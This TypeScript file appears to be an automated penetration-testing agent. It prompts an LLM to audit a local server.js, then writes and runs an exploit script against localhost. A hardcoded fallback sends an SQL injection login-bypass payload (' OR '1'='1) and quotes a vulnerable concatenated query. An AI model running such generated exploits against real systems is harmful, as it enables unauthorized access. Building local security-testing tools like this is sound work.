import { exec } from 'child_process';
import { promisify } from 'util';
import fs from 'fs/promises';
import path from 'path';

const execAsync = promisify(exec);

export interface AttackResult {
  vulnerabilityType: string;
  targetEndpoint: string;
  vulnerableLineOfCode: string;
  exploitPayloadUsed: string;
  exploitProofStatus: 'SUCCESS' | 'FAILED';
  rawOutput: string;
}

export class AttackerAgent {
  private apiKey: string;
  private targetUrl: string;
  private targetAppDir: string;

  constructor(targetUrl: string = 'http://localhost:5000', targetAppDir: string = './target-app') {
    this.targetUrl = targetUrl;
    this.targetAppDir = targetAppDir;
    this.apiKey = process.env.CURSOR_API_KEY || process.env.OPENAI_API_KEY || '';
  }

  /**
   * Protocol Step 1 & 2: Audit server.js code and generate the standalone exploit-test.js code.
   */
  public async analyzeAndGenerateExploitScript(targetSourceCode: string): Promise<{
    exploitCode: string;
    vulnType: string;
    endpoint: string;
    vulnLine: string;
    payloadUsed: string;
  }> {
    console.log(`[AttackerAgent] Auditing ./target-app/server.js for security vulnerabilities...`);

    const systemPrompt = `# ROLE
You are an expert offensive security engineer and penetration tester specializing in white-box source code auditing.

# OBJECTIVE
Analyze the target codebase, identify severe security vulnerabilities, write a dynamic script to exploit it, and execute it to prove the vulnerability exists.

# CONTEXT & BOUNDARIES
- Target Application Path: './target-app/server.js'
- Local Testing Server URL: '${this.targetUrl}'
- You have access to the local file system and terminal execution tools. Keep all testing local. Do not attempt to outbound download external exploitation frameworks.

# PROTOCOL (STEP-BY-STEP ACTIONS)
1. Read and audit the code inside './target-app/server.js' specifically checking for injection flaws, authentication bypasses, or broken access controls.
2. Programmatically write a standalone Node.js file named 'exploit-test.js' inside the './target-app/' directory.
3. The 'exploit-test.js' script must use the native 'fetch' API to send a crafted malicious payload targeting the security flaw you discovered on ${this.targetUrl}.

Output strictly in JSON format matching this schema:
{
  "vulnerabilityType": "e.g., SQL Injection",
  "targetEndpoint": "e.g., POST /api/login",
  "vulnerableLineOfCode": "Exact line from server.js that is vulnerable",
  "exploitPayloadUsed": "The exact input string or structure that broke the logic",
  "exploitScriptCode": "The complete, standalone Node.js code for exploit-test.js using native fetch to execute the attack and console.log the JSON result or raw response."
}`;

    const userPrompt = `Target Source Code (server.js):\n\`\`\`javascript\n${targetSourceCode}\n\`\`\``;

    try {
      if (!this.apiKey) {
        throw new Error("No API key configured");
      }

      const response = await fetch('https://api.openai.com/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${this.apiKey}`
        },
        body: JSON.stringify({
          model: 'gpt-4o-mini',
          messages: [
            { role: 'system', content: systemPrompt },
            { role: 'user', content: userPrompt }
          ],
          response_format: { type: 'json_object' },
          temperature: 0.2
        })
      });

      if (!response.ok) {
        throw new Error(`AI API request failed with status ${response.status}`);
      }

      const data: any = await response.json();
      const content = JSON.parse(data.choices[0].message.content);

      return {
        exploitCode: content.exploitScriptCode,
        vulnType: content.vulnerabilityType,
        endpoint: content.targetEndpoint,
        vulnLine: content.vulnerableLineOfCode,
        payloadUsed: content.exploitPayloadUsed
      };
    } catch (error: any) {
      console.warn(`[AttackerAgent] AI API call failed or missing API Key (${error.message}). Using fallback test exploit script.`);
      
      // Fallback exploit script for local testing when API key is not present
      const fallbackExploit = `// Standalone exploit-test.js
async function runAttack() {
  try {
    const res = await fetch("${this.targetUrl}/api/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "' OR '1'='1", password: "any" })
    });
    const text = await res.text();
    console.log("HTTP " + res.status + "\\n" + text);
  } catch (err) {
    console.error("Exploit Error: " + err.message);
  }
}
runAttack();
`;
      return {
        exploitCode: fallbackExploit,
        vulnType: "SQL Injection",
        endpoint: "POST /api/login",
        vulnLine: "const query = `SELECT * FROM users WHERE username = '${req.body.username}'`;",
        payloadUsed: "' OR '1'='1"
      };
    }
  }

  /**
   * Protocol Step 3 & 4: Write exploit-test.js to disk and execute it via node terminal command.
   */
  public async executeExploitScript(exploitCode: string): Promise<{ output: string; success: boolean }> {
    const scriptPath = path.join(this.targetAppDir, 'exploit-test.js');
    console.log(`[AttackerAgent] Writing standalone exploit script to ${scriptPath}...`);

    try {
      await fs.mkdir(this.targetAppDir, { recursive: true });
      await fs.writeFile(scriptPath, exploitCode, 'utf-8');

      console.log(`[AttackerAgent] Executing 'node ${scriptPath}'...`);
      const { stdout, stderr } = await execAsync(`node "${scriptPath}"`);
      const fullOutput = (stdout + '\n' + stderr).trim();

      // Check for success markers in output (e.g., 200 OK, auth token, welcome admin, success)
      const lowerOutput = fullOutput.toLowerCase();
      const success = (lowerOutput.includes('http 200') || lowerOutput.includes('welcome') || lowerOutput.includes('token') || lowerOutput.includes('success') || lowerOutput.includes('admin') || lowerOutput.includes('logged in')) && !lowerOutput.includes('401 unauthorized');

      return { output: fullOutput, success };
    } catch (error: any) {
      console.error(`[AttackerAgent] Execution error while running exploit script: ${error.message}`);
      return { output: error.message || 'Script execution failed', success: false };
    }
  }

  /**
   * Protocol Step 5 & Output Specification: Run the full audit, write exploit script, run it, and format summary.
   */
  public async runAttackLoop(targetSourceCode: string): Promise<AttackResult> {
    const analysis = await this.analyzeAndGenerateExploitScript(targetSourceCode);
    const execution = await this.executeExploitScript(analysis.exploitCode);

    const result: AttackResult = {
      vulnerabilityType: analysis.vulnType,
      targetEndpoint: analysis.endpoint,
      vulnerableLineOfCode: analysis.vulnLine,
      exploitPayloadUsed: analysis.payloadUsed,
      exploitProofStatus: execution.success ? 'SUCCESS' : 'FAILED',
      rawOutput: execution.output
    };

    console.log('\n=================== EXPLOIT AUDIT SUMMARY ===================');
    console.log(`- Vulnerability Type: ${result.vulnerabilityType}`);
    console.log(`- Target Endpoint: ${result.targetEndpoint}`);
    console.log(`- Vulnerable Line of Code: ${result.vulnerableLineOfCode}`);
    console.log(`- Exploit Payload Used: ${result.exploitPayloadUsed}`);
    console.log(`- Exploit Proof Status: ${result.exploitProofStatus}`);
    console.log('=============================================================\n');

    return result;
  }
}
